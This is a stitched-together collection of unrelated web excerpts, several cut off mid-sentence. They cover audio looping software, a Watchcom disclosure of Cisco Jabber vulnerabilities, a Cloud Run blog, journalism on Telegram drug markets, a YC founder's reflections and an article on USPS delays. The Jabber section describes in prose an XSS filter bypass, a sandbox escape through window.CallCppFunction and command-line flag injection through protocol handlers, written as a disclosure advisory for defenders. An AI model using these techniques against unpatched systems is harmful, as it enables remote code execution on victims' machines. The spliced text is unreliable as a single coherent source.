anymore. But, imagine you have a very noisy microphone preamp, like is the case
with some built-in mics: recording will not stop, even when you are 'silent',
and the buffer is filled mainly with noise. You may even think that
Slice//Jockey does not work at all. So, set the silence-threshold at least
above the noise floor. You may need to tune mic level in your computer's system
settings.
</p>

<img src="http://www.katjaas.nl/slicejockey/silencethreshold.gif" alt="">




<p>
Slice//Jockey3 runs on Linux, MacOS and Windows with various hardware
architectures (Intel 32/64 bit, ARM). In terms of CPU load an old skool netbook
with Atom processor used to represent the minimum hardware requirement for
Slice//Jockey. Raspberry Pi 3 and 4 are comfortable with the demands of
Slice//Jockey3 and leave enough CPU cycles to run other stuff simultaneously.
More powerful hardware like a recent laptop hardly notices the load. The main
window is tailored to fit a netbook display at least (1024*600).
</p>

<p>
Slice//Jockey was conceived in 2010 with touch screen in mind, anticipating the
expected proliferation of touch-enabled computers. In retrospect this was
over-optimistic. In 2019 laptops with touch screen are available but still a
minority. In the meantime an interesting breed of touch computers has become
affordable on the second hand market: Panasonic Toughbooks. Laptop/tablet
convertible CF-19 is my favorite, with resistive touch screen that works under
<a href="http://www.katjaas.nl/linux/touch.html">Linux</a> too.
</p>

<img src="http://www.katjaas.nl/slicejockey/toughbook.jpg" alt="">

<p>
General purpose computers with touch screen remain on the fringe, and
Slice//Jockey with them. People have sometimes asked "When comes Slice Jockey
for iPad?" This is unlikely to happen. The fun …</p></div>

<p><img alt="" src="https://watchcom.no/siteassets/jabber-calc.gif" height="720" width="1280"></p>
<p><em>Figure 1: The Jabber RCE vulnerability in action.</em></p>
<p>Security consultants from Watchcom discovered the four high severity vulnerabilities while pen-testing for a client. The vulnerabilities affect all currently supported versions of the Cisco Jabber client (12.1 – 12.9). The four vulnerabilities and their corresponding CVE numbers are listed below:</p>
<ul>
<li>CVE-2020-3495: Cisco Jabber Message Handling Arbitrary Code Execution (CVSS 9.9)</li>
<li>CVE-2020-3430: Cisco Jabber Protocol Handler Command Injection (CVSS 8.0)</li>
<li>CVE-2020-3498: Cisco Jabber Information Disclosure (CVSS 6.5)</li>
<li>CVE-2020-3537: Cisco Jabber Universal Naming Convention Link Handling (CVSS 5.7)</li>
</ul>
<p>This article describes the technical details of the vulnerabilities and gives useful advice for detection and mitigation.</p>
<h3>Introduction</h3>
<p>Cisco Jabber is a video conferencing and instant messaging application. It is mainly used for internal communication, but can also be used to chat, call or conduct meetings with people outside of the organization. These days a lot of people are working from home and applications like Cisco Jabber are essential to stay connected, communicate efficiently and keep businesses running smoothly.</p>
<p>Given their newfound prevalence in organizations of all sizes, these applications are becoming an increasingly attractive target for attackers. A lot of sensitive information is shared through video calls or instant messages and the applications are used by the majority of employees, including those with privileged access to other IT-systems.</p>
<p>The security of these applications is therefore paramount, and it is important to ensure that both the applications themselves, and the infrastructure they are using, are regularly audited for security gaps.</p>
<p>During a recent penetration test for an unrelated client, security consultants Olav Sortland Thoresen and Torjus Bryne Retterstøl from Watchcom discovered four serious vulnerabilities in Cisco Jabber. The vulnerabilities range from medium to critical severity and two of the vulnerabilities can be used to gain remote code execution. The most severe vulnerability is also wormable, meaning that it can be used to automatically spread malware without any user interaction.</p>
<p>Watchcom immediately reported these vulnerabilities to Cisco and coordinated a responsible disclosure. Patches have been issued and all Cisco Jabber users are strongly encouraged to update to the latest version.</p>
<h3>Background</h3>
<p>All four vulnerabilities affect the Cisco Jabber client application and were tested on Windows. The Cisco Jabber client is based on the Chromium Embedded Framework (CEF) and uses the Extensible Messaging and Presence Protocol (XMPP) for instant messages and presence updates. These two technologies are important for understanding the vulnerabilities and their implications. A brief overview of each of them is therefore provided below.</p>
<h3>Chromium Embedded Framework (CEF)</h3>
<p>CEF is a framework that allows developers to embed Chromium-based web browsers in their applications. It is used to create desktop applications based on web technologies like HTML, CSS and JavaScript. Normally, the code running in the embedded web browser is sandboxed and cannot access files or perform system calls. While this is a good security measure, application developers often want such functionality in their application and therefore find or create ways to bypass the sandbox.</p>
<p><em><strong>This leaves applications vulnerable in scenarios where the sandbox normally would’ve provided protection.</strong></em></p>
<p>Additionally, many applications that use CEF choose to pass through command line flags to the embedded web browser. This means that many CEF applications accept <a href="https://www.chromium.org/developers/how-tos/run-chromium-with-flags" target="_blank">Chromium command line flags</a>. Some of these flags can be used to execute arbitrary commands or load arbitrary DLLs and should therefore be treated with caution.</p>
<h3>Extensible Messaging and Presence Protocol (XMPP)</h3>
<p>XMPP is an XML-based protocol for instant messaging and presence. It is based on an open standard and is widely used in both open-source and proprietary software. XMPP is an extensible protocol and several extensions that provide additional functionality to the protocol exist.</p>
<p><img alt="" src="https://watchcom.no/siteassets/figure2.png" height="209" width="1137"> <em>Figure 2: An XMPP message containing both a plaintext and an HTML version of a message.</em></p>
<p>One of these extensions is XEP-0071: XHTML-IM. This extension defines how instant messages containing HTML formatted content can be exchanged over XMPP. Since HTML content can contain malicious elements, the specification states that applications must assume that messages containing HTML are malicious and sanitize them accordingly.</p>
<p>It also states that it must be possible for users to prevent automatic loading of images. Not all applications take such precautions and we will later see how this is the root cause of two of the vulnerabilities that we discovered.</p>
<h3>Cross Site Scripting Leading to RCE Vulnerability</h3>
<p>Cisco Jabber is vulnerable to Cross Site Scripting (XSS) through XHTML-IM messages. The application does not properly sanitize incoming HTML messages and instead passes them through a flawed XSS filter.</p>
<p>The filter is based on a blacklist of known-bad tags and attributes, but it is not comprehensive. Since the application is based on CEF, its embedded web browser will execute any scripts that can pass through the filter.</p>
<p>We discovered that the filter could be bypassed using the lesser-known onanimationstart attribute. Tags that had this attribute were not caught by the filter and were directly inserted into the embedded web browser’s DOM. This attribute is used to specify a JavaScript function that will be called when an element’s CSS animation starts playing. To achieve XSS using this attribute the element must have an animation assigned to it. It was not possible to inject custom CSS animations since &lt;style&gt; tags were caught by the filter, but we discovered a built-in animation called spinner-grow by grepping through the files in the installation directory. By combining these two, it was possible to create malicious HTML tags that bypassed the filter and were executed.</p>
<p><img alt="" src="https://watchcom.no/siteassets/figure3.png" height="387" width="1003"> <em>Figure 3: An XHTML-IM message that has been intercepted and modified. A malicious &lt;img&gt; tag has been added.</em></p>
<p>Cisco Jabber uses XHTML-IM by default for all messages. A malicious message can therefore easily be created by intercepting an XMPP message sent by the application and modifying it. Attackers can do this manually on their own machine or it can be automated to create a worm that spreads automatically.</p>
<p><img alt="" src="https://watchcom.no/siteassets/figure4.png" height="783" width="1123"> <em>Figure 4: When the victim receives the message, the JavaScript code is executed. In this case the code opens an alert box as a proof of concept.</em></p>
<p>After achieving XSS, we started looking for ways to escape the CEF sandbox. A vulnerable function (named window.CallCppFunction) was identified. This function is used to invoke native C++ code and the application uses it to, among other things, open files received from other Cisco Jabber users.</p>
<p>We discovered that this function can be abused by an attacker to run arbitrary executable files on the victim’s machine. The function takes a file:// URL as its second parameter and by manipulating this parameter an attacker can execute arbitrary .exe files.</p>
<p><em><strong>Since Cisco Jabber supports file transfers, an attacker can initiate a file transfer containing a malicious .exe file and force the victim to accept it using an XSS attack. </strong></em></p>
<p>The attacker can then trigger a call to window.CallCppFunction, causing the malicious file to be executed on the victim´s machine.</p>
<p><img alt="" src="https://watchcom.no/siteassets/figure5.png" height="464" width="794"> <em>Figure 5: An XHTML-IM message containing exploit code that escapes the CEF sandbox and launches calc.exe on the victim’s machine.</em></p>
<p>This vulnerability has been assigned CVE-2020-3495 with a CVSS score of 9.9 (Critical) / CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H</p>
<h3>Protocol Handler Vulnerability</h3>
<p>While researching the XSS vulnerability, we discovered another high severity vulnerability concerning the handling of URLs with custom protocols.</p>
<p>Upon installation, Cisco Jabber registers protocol handlers for a number of different protocols. These are used to tell the operating system that whenever a user clicks on a URL containing one of the custom protocols (e.g. ciscoim:test@example.com) the URL should be passed to Cisco Jabber. In this case, the protocol handlers specify that the URL should be passed as a command line flag.</p>
<p><img alt="" src="https://watchcom.no/siteassets/figure6.png" height="255" width="1032"> <em>Figure 6: One of Cisco Jabber’s protocol handlers. The protocol handler specifies that URLs should be passed to the application as a command line flag.</em></p>
<p>These protocol handlers are vulnerable to command injection because they fail to consider URLs that contain spaces. By including a space in the URL, an attacker can inject arbitrary command line flags that will be passed to the application. Since the application uses CEF and accepts Chromium command line flags, several flags that can be used to execute arbitrary commands or load arbitrary DLLs exist. An example of such a flag is --GPU-launcher. This flag specifies a command that will be executed when CEFs GPU process is started.</p>
<p>This vulnerability can be combined with the XSS vulnerability to achieve code execution without transferring any files to the victim. This makes it possible to deliver malware without writing any files to disk, thus bypassing most antivirus software.</p>
<p>The video below shows the vulnerability being exploited. The attacker sends a malicious message, containing an XSS payload that escapes the CEF sandbox and uses the protocol handler vulnerability to execute commands on the …</p></div></div>

This space has rapidly evolved from the old days of BSD’s jails and Solaris’s Zones to the current new hot toy: serverless computing.</p><p id="b9ac">There are two common ways to do serverless: cloud function and cloud run, and there is very little difference between the two approaches:</p><p id="0a7f"><strong>Cloud Function:</strong> a single purpose function that can be triggered via events or HTTP calls. The most common usage is database triggers (e.g: alert hotel staff on VIP persona arrival) and storage triggers (e.g: detect objects on user photo upload). However, the functions have to take less than 9 minutes to perform its tasks, and it also starts a new instance upon 10 concurrent requests.</p><p id="3f1f"><strong>Cloud Run</strong>: is stateless containers and natively portable, there is no limitation in languages, binaries or dependencies. It is only triggered via HTTP calls (or Pubnub), and the most common usage can be any workload like data batching and ML inference. Cloud Run is also capable to run 80 concurrent requests.</p><p id="3b06">Even though I am a cloud function fan, I have to experiment with Cloud Run as it is more suitable for the task at hand. The Trueface SDK is built and available as a C++ library, and we also support Python 3 as a first-class binding. I have chosen to build the web app using C++ instead of Python because of performance and it is therefore a lower cost to run. I also have picked a little library called <a href="https://github.com/yhirose/cpp-httplib" target="_blank" rel="noopener nofollow">cpp-httplib</a> to help me.</p><p id="5c9e">My objective is: given two face images, I have to measure the probability of a match. This is a common scenario for access control or identity verification. Now to the code:</p><figure><div></div></figure><p id="cb67">The web app is very simple, it listens on port 8080 to POST requests, once I receive a request to /match, I extract the face features from both images then calculate similarity and respond with match probability as a plain/text value.</p><p id="187e">Despite room for optimizations, the code above achieves the task at hand perfectly. In order to run it on Cloud Run, it has to be containerized using Docker, then pushed to Google Container Registry (just like Docker hub, but private). This service charges for storage, network egress, and vulnerability scanning, I have disabled vulnerability scanning and in my case, the network egress is free. The last variable is storage which is $0.026 per GB per month. The Trueface SDK plus the Ubuntu minimal image count for 500 MB, which means I will pay $0.01 per GB per month. Once you push the container, you see three options to deploy the container: Google Cloud Run, GKE, and GCE.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p><span>I</span>n February 2019, Amos Dov Silver, a slight man in his mid-30s who often wears his shoulder-length hair in a bun, received a Telegram message inviting him to a wedding in Ukraine. The sender had worked with Silver for more than two years and wanted him to stand in for his father at the altar. “As you know, I don’t have a family,” he wrote. Silver agreed, and the following month, he flew from Arizona to Kyiv. Less than 48 hours later, he awoke to find five Israeli police officers standing in his hotel room.</p>



<p>Silver, an American-Israeli from a Hasidic background, started using his Facebook page as a marketplace to connect marijuana dealers with buyers in 2015, after years of loudly advocating for the drug’s legalization in Israel. This was four years after the emergence of <a href="https://www.vanityfair.com/news/2017/04/silk-road-ross-ulbricht-drugs-murder">Silk Road</a>, which quickly became the gold standard for decentralized, anonymous marketplaces operating on the darknet. Founded by the American Ross Ulbricht (whose online <em>nom de guerre </em>was<em> </em>“Dread Pirate Roberts”), Silk Road was estimated to be worth over $1 billion within two years of its founding, selling everything from pot to AK-47s. As the website grew in notoriety, Ulbricht became a model for a new generation of digital drug kingpins — and, with his arrest in 2013, a harbinger of what might await successors like Silver.&nbsp;</p>



<p>When Israel decriminalized recreational marijuana use in 2017, Silver and a team of coders and managers transferred their service to the Russian messaging platform Telegram. The app is popular with activists and journalists around the world because of its end-to-end encryption, which means that the cryptographic keys needed to decrypt a message are stored with only the sender and receiver. This makes it essentially impossible for anyone, even the app maker, to decode an intercepted message. Thanks to this built-in anonymity, buying drugs through Telegrass became as easy as ordering a pizza. Unlike traditional drug cartels, Telegrass leadership doesn’t profit from individual deals; instead, to advertise their wares, dealers pay 420 shekels ($122.25) for access to the platform. Unscrupulous sellers are kicked off and get their names posted on a “wall of shame.”</p>



<p>When Telegrass arrived in Ukraine in 2017, its operators found conditions perfectly suited to running a black-market business. A permissive legal landscape and weak rule of law — as well as the large number of visiting Israelis — made it a natural candidate for Telegrass’ expansion. Additionally, while most countries mandate some form of identity verification to purchase a SIM card and register a phone number, Ukraine — along with Israel and the United States — does not, making it impossible for law enforcement to trace Telegram accounts registered under a phone number.</p>



<p>Soon after Telegrass launched in Ukraine, thousands of competing channels emerged, with the most popular attracting tens of thousands of subscribers. The old style of drug dealing, based on face-to-face interactions between consumers and dealers, disappeared. Viacheslav Markov, dean of the Faculty of Cyber Police at the Kharkiv National University of Internal Affairs, has said that 90% of drug sales in Ukraine now occur via Telegram. Viacheslav Safonov, the deputy head of Ukraine’s Department for Combating Drug Crimes, concurs. In addition to being better for advertising, the new system is safer for dealers. When buyers knew who they had purchased drugs from, there was an inclination to “share” that information with law enforcement when pressed. Now, that’s no longer possible.</p>



<p>In prosecuting Silver, Israeli authorities claimed that “Telegrass changed the face of crime.” Less than two years after his arrest, it’s unclear whether Silver was personally responsible for transforming the drug market or if he was simply an early and influential adopter of technology that would become the status quo. Whichever is true, it’s clear that, in many parts of the world, the system that Telegrass perfected has become the dominant model for buying and selling illegal drugs.</p>

<p><strong>In Kyiv, graffiti</strong> advertising Telegram drug channels is visible on nearly every city block, with tags directing buyers to @go420, @Kushcrew, or @kyivweeds. David Plaster, who runs the Kyiv-based nonprofit Anomaly, said his organization painted over more than 15,000 tags over the last 18 months, half in the capital alone. But as soon as the graffiti is eliminated, more appears. And removing it has little impact on business. Marijuana, which is grown in outlying cities near Kyiv, accounts for an estimated 13 billion hryvnias ($500,000,000) in sales per month across Ukraine. The operations are decentralized, so employees often have no idea who they’re working with, or for. That means that even if low-level dealers get busted, suppliers and distributors remain hidden from law enforcement. “Even with a sting operation, faking a channel, you can only get the buyer; it doesn’t help with the supply chain,” Plaster explained. “You can’t crack that closed loop.”</p>

<p>Once a customer joins a drug channel on Telegram, a bot will typically respond with a menu of items available for purchase. On a typical day, offerings might include a popular strain called Gagarin, named for the Soviet cosmonaut, which is advertised as a hybrid with “aromas of mint and blueberry,” or a strain called White Russian, which is earthy and spicy with “cheese flavor.” When a customer makes a selection, an anonymous operator will send a link asking for payment via cryptocurrency or through an encrypted payment platform, which in Ukraine is usually EasyPay, a Belarusian e-payment platform that allows money transfers to be made via a phone number rather than a bank account. After the money is received, the seller will send an image that includes an address or GPS coordinates signaling where the drugs are hidden.</p>



<p>That day, March 12, law enforcement agents from Israel, the U.S., Ukraine, and Germany arrested 42 people in those countries in connection with Telegrass, the encrypted drug marketplace that Silver co-founded and ran. Directed by the Israel National Cyber Directorate, the bust marked the final stage of an international operation to take down the enterprise, which, by 2018, grossed an estimated $17 million a month in sales. Telegrass was one of the world’s biggest app-based drug markets, and, from Israel, it migrated to Germany, Ukraine, and other countries in Europe, spawning countless copycats.</p>



<p>The main downside of a fully anonymous marketplace is that it lends itself easily to fraud. Common scams include sellers accepting money before deleting a Telegram conversation or simply giving buyers phony drop-off locations. “[The channels are] often operated by men in prison who send these messages on their phones,” an anonymous buyer told <em>Rest of World</em>, adding that he would frequently have to try four or five different services before finding one that worked. Safonov, of the country’s anti-drug office, confirms that this kind of fraud makes up “one of the main types of ‘earnings’ for prisoners,” who will offer products at lower price points to target “novice consumers and those trying to save money.”</p>



<p>High levels of police mistrust have also contributed to theories that police are not only protecting the drug trade but actively participating in it. Telegram user @glodov, who advocates for marijuana legalization in Ukraine, claims that certain drug delivery channels are operated by police as avenues for extortion. He cited an instance in which a buyer went to pick up a package and encountered two officers waiting for him. “They tell you that you need to pay $100 or $200, and then they will leave you alone,” he says. “They want you to pay not to go to jail.”</p>



<p>(This kind of institutionalized corruption hearkens back to an earlier era: In the post-Soviet 1990s, the country saw a boom in criminal gangs, with police often functioning as their enforcers. While Ukrainian officials initiated a massive police overhaul in 2015 to address structural problems in the force, only 7.7% of officers lost their jobs. Most appealed their dismissals and <a href="https://www.opendemocracy.net/en/odr/where-is-ukraines-new-police-force/">were eventually reinstated</a>.</p>



<p>Safonov also acknowledges that there has been illegal collaboration between authorities and dealers, even recently. In one <a href="https://hromadske.ua/posts/kolishni-policejski-organizuvali-narkolaboratoriyu-na-kiyivshini">notable instance earlier this year</a>, former police officers were found operating a methadone and amphetamine lab in an industrial building on the outskirts of Kyiv. But, he insists, this was an exception for an otherwise by-the-book force: “Bad grass grows in every garden.”</p>

<p><strong>Regardless of who</strong> is selling, Telegram is, by design, extremely difficult to police. “With an end-to-end encrypted app, users can reasonably expect that investigators won’t be able to access their chats,” said Riana Pfefferkorn, Associate Director of Surveillance and Cybersecurity at the Stanford Center for Internet and Society. While not all Telegram data is end-to-end encrypted, the company stores data in multiple centers controlled by different jurisdictions, to ensure that no government can access its systems. According to Pfefferkorn, “Companies such as Telegram and Signal intentionally minimize the amount of user metadata they store, precisely so that there is less that can be handed over to law enforcement if investigators come knocking.” (According to Telegram, while it will not interfere with private chats, it will block public channels it deems illegal, such as those belonging to terrorists and narcotraffickers.)</p>



<p>Even on an individual level, built-in accountability features can be easily circumvented. For instance, while each Telegram account must be …</p></div></div>

September 2, 2020 | https://tieshunroquerre.com/blog/yc-learnings | <a href="https://web.archive.org/web/*/https://tieshunroquerre.com/blog/yc-learnings">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p>I went through Y Combinator’s W16 batch for my company StrongIntro — we helped tech companies grow their engineering teams through employee referrals. I was 17 at the time and the youngest founder in the batch of 300+ entrepreneurs. Here's what I learned:</p> <h2>The people you respect are closer than you think</h2> <p>I devoured all of PG's essays and read founder bios in my spare time growing up. Coming from a Boston suburb, I thought it would take ages to get to Silicon Valley and meet the founders I respected, let alone work alongside them. But I was able to get a job in SF with a single cold email and zero connections. A year later I was in YC listening to the founders of Reddit and Airbnb share their stories and getting advice from PG.</p> <p>This is not the case in the rest of the world, but Silicon Valley is incredibly welcoming to newcomers. If you're willing to work hard and create value it's entirely possible to work alongside the people you most respect within a short time period. I consider that magic.</p> <h2>No one knows the right answer</h2> <p>One of the first lessons YC taught us is that the partners, who were successful entrepreneurs and operators, would give us conflicting advice and that that's normal. This felt wrong to me. In school, the experts — teachers — always knew the right answer, and yet these partners who were the most successful people I'd met couldn't give me “correct” answers that would guarantee my startup’s success.</p> <p>This dampened my amazement at the time but it was also empowering. It showed me that my ideas could be just as valid as someone who's incredibly successful.</p> <h2>You don't need experience to get started</h2> <p>Outside of my own experience of getting into YC at a young age, there are numerous other examples of founders succeeding wildly with little to no experience. The Airbnb founders didn't have experience in hospitality, and they only came up with the idea after brainstorming startup ideas because they wanted to start a company (ironically VCs usually say this is not a good way to start a company). More recently, my batchmate Boom has been making waves building supersonic passenger airplanes. The founder was a software engineer at Groupon before starting the company.</p> <h2>Experience is only loosely correlated with age</h2> <p>The average age of the founders in my batch was 30. Going into the program I was intimidated that everyone else had so much more working experience than me, but I quickly learned that we were all winging it as most were first time founders like myself. YC's group office hours were a time for founders to share what they were struggling with, and everyone, regardless of age struggled with the same general problems such customers not liking their product enough, not growing fast enough, and cofounder difficulties.</p> <h2>Silicon Valley doesn't care about your background</h2> <p>In the East Coast experience and status are highly valued. Bill Gates created class scheduling software in high school, and I wanted to replicate that. I approached our school admin about doing the same when I was 16 and was promptly shut down because I was too young and "entire companies are required to create scheduling software." I wasn't even given the chance to fail.</p> <p>In contrast, no one cared about my age in YC. Most people didn't realize I was 17, and if they learned my age they always saw it as a positive trait instead of something that would hold me back. This stark difference in mindset makes sense when you consider how many young founders have famously succeeded in Silicon Valley (Steve Jobs, Bill Gates, Mark Zuckerberg) which is a trend that still persists to this day (Scale, Brex, Luminar).</p> <h2>Failure is acceptable</h2> <p>My company ultimately didn't succeed (we realized we needed to build a services business more than a technology business and that's not what we set out to do), and that was entirely okay. Most YC companies fail and it's baked into their business model — YC partners were even willing to fund my next business. This surprised me because school trained me to avoid failure at all costs — a single bad grade could tarnish my GPA permanently. The consensus goal was to get the right grades and internships to build a good resume, without any gaps that could tarnish the record.</p> <p>Silicon Valley's willingness to embrace failure is unintuitive but entirely logical. Startups aren't like school because there's no guaranteed playbook for starting a successful company — you need good execution but also experimentation and luck. Most applicants get rejected from YC multiple times before getting in, and most founders fail multiple times before succeeding. Travis Kalanick's first company failed. His second company had a modest exit after 6 years of grinding, and his third company was Uber. The Honey founders ran startups that didn’t go anywhere for years before they started Honey. Twitch was a struggling general-purpose streaming site before they doubled down on the gaming niche. The examples are endless. Failure is a necessary ingredient to success and Silicon Valley rightly internalizes that.</p> <div> <h3>Random musings</h3> <h4>East Coast vs West Coast</h4> <p>There's a more generalizable point in that the East Coast is typically more conservative than the West Coast. This is observable when dealing with venture capitalists from both sides as well. East Coast VCs are much more conservative, which is ultimately bad because it results in less moonshots succeeding. There are exceptions as well of course (ie Thrive Capital is ambitious and will bet on moonshots).</p> </div> </div></div>]]>

<p>The Factual set out this week to round up the latest on the USPS and clarify key issues using the most credible stories about the topic from across the political spectrum. Our key takeaways:</p>
<ol>
<li>DeJoy’s reforms at the USPS are meant to shore up the long-ailing agency, but his changes have led to a <a href="https://slate.com/business/2020/08/usps-mail-slowdown-dejoy-trump-election.html" rel="noopener" target="_blank"><span>slowdown in mail delivery</span></a>. This comes at a time when mail delivery and security are top concerns for citizens about to vote in a general election and when <a href="https://www.washingtonpost.com/business/2020/08/22/chicks-cockroaches-crickets-frogs-how-mail-delays-are-affecting-live-animal-trade/" rel="noopener" target="_blank"><span>low-cost shipping</span></a> is crucial for small businesses.</li>
<li>Despite accusations of a plot by Trump to hinder the USPS before the election, and albeit suspicious timing, there’s not much hard evidence that the changes are likely to impact the delivery of mail-in ballots — or are <a href="https://reason.com/2020/08/06/america-is-going-to-vote-by-mail-were-not-ready/" rel="noopener" target="_blank"><span>intended to do so</span></a>.

<h3><strong><br>Why Are People Worried About the Mail?</strong></h3>
<div><p>Mail delivery has started to experience serious and widespread delays immediately following a series of policy changes enacted by Postmaster General Louis DeJoy in July. The impacts have been felt widely across the country. <a href="https://www.nytimes.com/2020/08/20/health/Covid-us-mail-prescription-drugs.html" rel="noopener" target="_blank"><span>Seniors</span></a> and<a href="https://connectingvets.radio.com/articles/usps-delays-veteran-prescriptions-va-working-on-solutions" rel="noopener" target="_blank"> <span>veterans</span></a> have missed out on the timely delivery of medications that routinely arrive by mail — as many as <a href="https://www.foxnews.com/us/usps-delays-endanger-14-million-people-who-wont-get-their-medication-in-time-report" rel="noopener" target="_blank"><span>14 million Americans</span></a> may not receive needed medication on time. Poultry farmers that have used the mail to deliver baby chicks since 1918 have seen chicks <a href="https://www.washingtonpost.com/business/2020/08/22/chicks-cockroaches-crickets-frogs-how-mail-delays-are-affecting-live-animal-trade/" rel="noopener" target="_blank"><span>die by the thousands</span></a> due to delays in service. <a href="https://www.washingtonexaminer.com/news/small-businesses-say-theyre-suffering-mail-delivery-delays" rel="noopener" target="_blank"><span>Small businesses</span></a> that have relied on the competitive postage rates of USPS have seen packages go late or undelivered; their business models may entirely collapse if they are forced to use private shipping methods such as UPS and FedEx.</p></div>
<p><span><img src="https://lh6.googleusercontent.com/OqZHoIvQXDtuoWRBkEACBkCYSr7YXmQUncjH599Z6p2vjb6h-hS-yJ6rdvi0Tza0QaegBgHjomfbLKp3nnE_p0KH1qNRoNZaN-WbAbrTuHiQdabUfKQMlDN-W4eRYiiQpu4rykhR" width="624" height="359"></span></p>
<div><p>The decline in processing time (orange line) is what is driving the delays in mail delivery.&nbsp;Source: USPS.&nbsp;</p></div>
<p>The impacts are geographically diverse as well. Across postal delivery regions where first-class mail tends to arrive on-time 90% of the time or more, there has been <a href="https://slate.com/business/2020/08/usps-mail-slowdown-dejoy-trump-election.html" rel="noopener" target="_blank"><span>double-digit declines</span></a> in the percentage of mail delivered on time, with sub-areas like Northern Ohio falling to just 68%. In aggregate, the national percentage of on-time delivery declined from 91% to 84%. Meanwhile, <a href="https://www.businessinsider.com/usps-california-overwhelme-food-rots-and-animals-dies-in-cuts-chaos-2020-8" rel="noopener" target="_blank"><span>reports have emerged</span></a> of mailing locations overrun with packages of rotting fruit, poultry, and other perishable products — all the product of new operational changes that seem to have reduced the USPS’s ability to deliver mail on time. DeJoy has <a href="https://slate.com/business/2020/08/usps-mail-slowdown-dejoy-trump-election.html" rel="noopener" target="_blank"><span>acknowledged the delays</span></a> and assumed at least some of the blame.&nbsp;</p>
<p>This downturn coincided with <a href="https://www.marketwatch.com/story/trump-explicitly-links-mail-in-voting-and-his-opposition-to-post-office-financial-relief-2020-08-13" rel="noopener" target="_blank"><span>remarks</span></a> from President Trump that expressed his distrust of mail-in ballots and preference for the postal service not to receive additional funding that would make it easier for more people to vote by mail: “They need that money in order to have the post office work so it can take all of these millions and millions of ballots . . . If they don’t get those two items, that means you can’t have universal mail-in voting because they’re not equipped to have it.” In the context of a heated national election just weeks away in which well over <a href="https://www.usatoday.com/story/news/2020/08/19/election-2020-biden-voters-twice-likely-vote-mail-survey-finds/3399498001/" rel="noopener" target="_blank"><span>a third of registered voters</span></a> are expected to vote by mail, the consequences of potential politically-motivated meddling with the postal service have not been not lost on civil society or Trump’s political opponents.</p>
<p>“It was after DeJoy got to work that the mail delays began, according to multiple postal service-related union leaders and trade groups interviewed by Recode.” - <a href="https://www.vox.com/recode/2020/8/7/21358946/postal-service-mail-delays-election-trump-mail-in-ballots" rel="noopener" target="_blank"><span>Vox</span></a></p>
<div><p>Driving these concerns is that DeJoy appears to be a politically-motivated appointment (common in both Republican and Democratic administrations) and a <a href="https://www.salon.com/2020/08/18/postmaster-general-louis-dejoy-donated-big-to-gop-trump--his-wife-got-ambassador-post/"><span>large donor</span></a> to the Republican Party and Trump’s campaign. The timing of Trump’s remarks with the rapid deterioration in the postal service gave rise to concern that these events were in fact connected and intentional, rather than <a href="https://www.usatoday.com/story/news/factcheck/2020/08/10/fact-check-request-ballots-early-but-mail-isnt-intentionally-slow/5538705002/"><span>coincidental and untargeted</span></a>, and could have enormous impact on an upcoming election. Coupled with the more mundane changes to an essential service for many Americans, understanding exactly what is going on with the postal service has become of vital importance.</p></div>
<h3><strong>DeJoy’s Reforms to the USPS</strong></h3>
<p>DeJoy inherited an already ailing government agency burdened by shifting patterns of demand (total mail volume <a href="https://facts.usps.com/table-facts/" rel="noopener" target="_blank"><span>has declined</span></a> by roughly 16% since 2010 ) and <a href="https://ips-dc.org/how-congress-manufactured-a-postal-crisis-and-how-to-fix-it/" rel="noopener" target="_blank"><span>unrealistic financial burdens</span></a> (USPS must pre-fund its post-retirement healthcare costs for 75 years into the future, a cost imposed on no other government agency). Covid-19 has placed further pressure on the agency. Approximately 40,000 of its 600,000 employees have been <a href="https://www.tampabay.com/news/health/2020/08/06/mail-carriers-deliver-medicine-and-mail-till-dark-thanks-to-covid-19/" rel="noopener" target="_blank"><span>placed under quarantine</span></a> since the pandemic started. A further decline in the mailing of letters has thankfully been offset by a <a href="https://www.washingtonpost.com/business/2020/06/25/postal-service-packages-coronavirus/" rel="noopener" target="_blank"><span>surge in packages</span></a>, an economic boost that looks likely to keep the USPS solvent into 2021.&nbsp;</p>
<p>Chronic loss-making has driven conservatives’ criticism of wasteful government spending and led to demands for privatization. Liberal perceptions have it that the agency serves as critical connective sinew that delivers essential services to places the private sector would leave behind. An experienced businessman, DeJoy began as postmaster general in June and set out to curb losses and reform the system.</p>
<p>Among his changes, the most notable have focused on:</p>
<ul>
<li><strong>Overtime hours and operational changes:<br></strong><span>Many of the mail delays experienced around the country are likely related to DeJoy’s rules about limiting overtime and </span><a href="https://www.washingtonexaminer.com/news/small-businesses-say-theyre-suffering-mail-delivery-delays" rel="noopener" target="_blank">additional daily trips</a><span>. For a long time, on-time mail delivery has been driven in large part by </span><a href="https://www.tampabay.com/news/health/2020/08/06/mail-carriers-deliver-medicine-and-mail-till-dark-thanks-to-covid-19/" rel="noopener" target="_blank">long-hours</a><span> and additional </span><a href="https://www.usatoday.com/story/news/factcheck/2020/08/10/fact-check-request-ballots-early-but-mail-isnt-intentionally-slow/5538705002/" rel="noopener" target="_blank">daily trips</a><span> by mail carriers when the mail for a specific route couldn’t be carried in one trip. These limitations, along with </span><a href="https://www.vice.com/en_us/article/wxq47q/usps-plans-to-slash-hours-at-many-post-offices-hoping-to-save-a-buck" rel="noopener" target="_blank">shortened post office hours</a><span>, are pretty clearly connected to mail delays across the country.</span></li>
<li><strong>Mail sorting machines: </strong>These changes sound ominous, especially in the face of a glut of election-related mail, but are not particularly out of the ordinary. Given the declining trends in mail, the USPS regularly takes such machines out of service, though this year’s declines are <a href="https://www.washingtonpost.com/business/2020/08/20/postal-service-mail-sorters-removals/" rel="noopener" target="_blank"><span>larger than normal</span></a> — equivalent to about 13% of the USPS’s total sorting capacity (USPS removed 3% in 2018 and 5% in 2019).</li>
</ul>
<ul>
<li><strong>Removal of public mailboxes: </strong>Mailbox removals are also fairly normal for the postal service, given the declining trends in mail volume. <a href="https://thehill.com/homenews/administration/512538-postal-service-defends-removing-mailboxes-after-stack-of-discards" rel="noopener" target="_blank"><span>Viral images</span></a> of box removals, both legitimate and years-old, stoked concerns that such changes would negatively impact the forthcoming election. DeJoy <a href="https://slate.com/business/2020/08/usps-mail-slowdown-dejoy-trump-election.html" rel="noopener" target="_blank"><span>testified that</span></a> about 700 boxes have been removed under his tenure and that 35,000 have been removed in the last decade (roughly 3,500 a year).</li>
